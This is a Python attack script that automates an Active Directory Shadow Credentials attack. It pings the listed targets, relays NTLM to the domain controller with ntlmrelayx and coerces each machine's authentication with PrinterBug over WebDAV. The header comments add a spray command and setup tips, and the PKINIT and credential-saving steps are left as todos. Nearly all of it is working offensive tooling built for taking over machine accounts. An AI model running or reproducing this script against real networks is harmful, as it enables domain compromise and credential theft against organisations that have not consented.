#!/usr/bin/env python3
# this script will relay to LDAP, take over the computers vulnerable to printerbug and webdav client, and save the credentials for them.
# Use PKINIT to unPAC the NTLM, save it alongside the machine, and request service tickets for CIFS on all affected computers using overpass-the-hash.
# Uses ./targets.txt for a list of targets
# Best to spray the vulnerable to webdav client and printerbug
# nxc smb <CIDR> -u user -p pass -M printerbug,webdav
# You'll need NETBIOS name, use ADIDNS to add it `krbrelayx/dnstool.py`

# Shadow Target Specification - MACHINE.DOMAIN

import sys
import subprocess
import os
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-d', required=True)
parser.add_argument('-u', required=True)
parser.add_argument('-p', required=True)
parser.add_argument('-dc-target', required=True)
parser.add_argument('-shadow-targets-file', required=True)
parser.add_argument('-listen', required=True)
args = parser.parse_args()

DOMAIN = args.d
USERNAME = args.u
PASSWORD = args.p
DC_TARGET = args.__dict__['dc-target']
TARGETS_FILE = args.__dict__['shadow-targets-file']
LISTEN_NETBIOS = args.listen

REACHABLE_HOSTS = "reachable_hosts.txt"
open(REACHABLE_HOSTS, 'w').close()

print("[+] Checking host reachability...")
with open(TARGETS_FILE) as f:
    for target in f:
        target = target.strip()
        if not target:
            continue
        print(f"Pinging {target}...")
        if subprocess.run(["ping", "-c", "1", "-W", "1", target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
            print(f"{target} is reachable.")
            with open(REACHABLE_HOSTS, 'a') as rf:
                rf.write(target + "\n")
        else:
            print(f"{target} is not reachable. Skipping...")

if os.stat(REACHABLE_HOSTS).st_size == 0:
    print("[-] No reachable targets found. Exiting.")
    sys.exit(1)

print("[+] Starting Shadow Credentials attack on reachable targets")
with open(REACHABLE_HOSTS) as f:
    for target in f:
        target = target.strip()
        if not target:
            continue
        SHADOW_TARGET = target.split('.')[0] + "$"
        print(f"[+] Starting relay for target: {target} with shadow target: {SHADOW_TARGET}... and DC {DC_TARGET}")
        relay_proc = subprocess.Popen(
            ["python3", "ntlmrelayx.py", "-t", DC_TARGET, "--shadow-credentials", "--shadow-target", SHADOW_TARGET, "--no-da", "--no-acl", "--no-validate-privs"]
        )
        time.sleep(5)
        print(f"[+] Using PrinterBug to coerce authentication with listener: {LISTEN_NETBIOS}...")
        subprocess.run(["python3", "printerbug.py", f"{DOMAIN}/{USERNAME}:{PASSWORD}@{SHADOW_TARGET}", f"{LISTEN_NETBIOS}@80/print"])
        time.sleep(5)
        relay_proc.terminate()
        print(f"[+] Completed relay attack for target: {target}")
        
        # todo save the Ntlmrelay cert with pass output to file and rename cert to match computer

# todo PKINIT

print("[+] All targets processed.")
